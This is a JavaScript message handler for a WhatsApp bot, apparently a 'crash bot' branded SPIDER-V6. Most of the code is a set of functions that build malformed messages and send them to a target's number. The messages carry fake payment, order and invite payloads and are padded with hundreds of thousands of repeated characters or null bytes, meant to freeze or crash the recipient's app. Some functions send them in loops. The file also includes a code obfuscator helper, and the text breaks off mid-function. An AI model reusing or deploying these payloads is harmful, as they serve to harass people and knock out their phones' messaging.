module.exports = async (deltaxcrash, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const { default: makeWaSocket, useMultiFileAuthState } = require('baileys')
const isGroup = from.endsWith('@g.us')
const botNumber = await deltaxcrash.decodeJid(deltaxcrash.user.id)
const sender = m.key.fromMe ? (deltaxcrash.user.id.split(':')[0]+'@s.whatsapp.net' || deltaxcrash.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await deltaxcrash.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/samcrash.apk`)
const { ios } = require("./virtex/ios.js")
// BUAT NGEBLOK NOMOR LUAR YANG PASARAN
if (m.sender.startsWith('212')) return deltaxcrash.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('48')) return deltaxcrash.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('60')) return deltaxcrash.updateBlockStatus(m.sender, 'block')
// WARNA ACAK
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
let run = runtime(process.uptime())
// PERINTAH IN CONSOLE
if (isCmd) {
console.log(chalk.white.bgRed.bold('Massage'), color(`[𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6H]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}
        // HARI
        
        const hariini = moment.tz('Africa/Nairobi').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Africa/Nairobi').format('HH : mm :ss')
        const wit = moment.tz('Africa/Nairobi').format('HH : mm : ss')
        const wita = moment.tz('Africa/Nairobi').format('HH : mm : ss')

        const time2 = moment().tz('Africa/Nairobi').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Good night 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Good afternoon 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Good afternoon 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Good afternoon 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Good morning 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Enjoy Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Good midnight 🌃'
        }
        
// Read Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// BUTTON VIDEO
   deltaxcrash.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: deltaxcrash.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  header: {
                     hasMediaAttachment: true,
                     videoMessage: video.videoMessage,
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `฿Ɏ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒Ӿ₵Ɽ₳₴Ⱨ`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await deltaxcrash.sendPresenceUpdate('composing', jid)
      return deltaxcrash.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const xbug2 = {

key: {

remoteJid: 'status@broadcast',

fromMe: false, 

participant: '0@s.whatsapp.net'

},

message: {

listResponseMessage: {

title: 'SPIDER-V6'

}

}

}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴#𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}




//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜₴ɆⱠ₮₳⃟🔥᜴ # 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🔥 SPIDERXcrash - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: '𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6- Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}



const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "25478213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await deltaxcrash.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaxcrash.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaxcrash.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: samuelcircute@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://youtube.com/@king_sam_hub?si=hgjA9TKM90vaGPEW
item3.X-ABLabel:YouTube\n
item4.ADR:;;Kenya;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await deltaxcrash.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Spider`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

/// FUNCTION BUG 
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️࿆᷍🥷᜴͆𝕶𝖎𝖓𝖌 𝕾𝖆𝖒ׁׅ֮̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝒟𝐸𝐿𝒯𝒜𝒞𝑅𝒜𝒮𝐻ཀ͜͡😈⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    deltaxcrash.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await deltaxcrash.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await deltaxcrash.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return deltaxcrash.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return deltaxcrash.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

//=================================================//
async function aipong(target) {
await deltaxcrash.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝕶𝖎𝖓𝖌 𝕾𝖆𝖒ׁׅ֮╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝕶𝖎𝖓𝖌 𝕾𝖆𝖒𝚑ཀ͜͡🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

//Status
if (!deltaxcrash.public) {
if (!m.key.fromMe) return
} 

//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰Đɇⱡ₮₳ ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/d725cb646cb63f7559486.jpg" } }, { upload: deltaxcrash.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #Spidercrash"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ☠️..."
]
let { key } = await deltaxcrash.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await deltaxcrash.sendMessage(from, {text: xeonlod[i], edit: key });
}
}
        
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝕶𝖎𝖓𝖌 𝕾𝖆𝖒•₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝕶𝖎𝖓𝖌 𝕾𝖆𝖒Ӿ99ཀ͜͡😈⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝕶𝖎𝖓𝖌 𝕾𝖆𝖒•₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝕶𝖎𝖓𝖌 𝕾𝖆𝖒Ӿ99ཀ͜͡😈⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await deltaxcrash.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
deltaxcrash.relayMessage(jid, order.message, { messageId: order.key.id})
}


const reply = (teks) => { 
deltaxcrash.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6", 
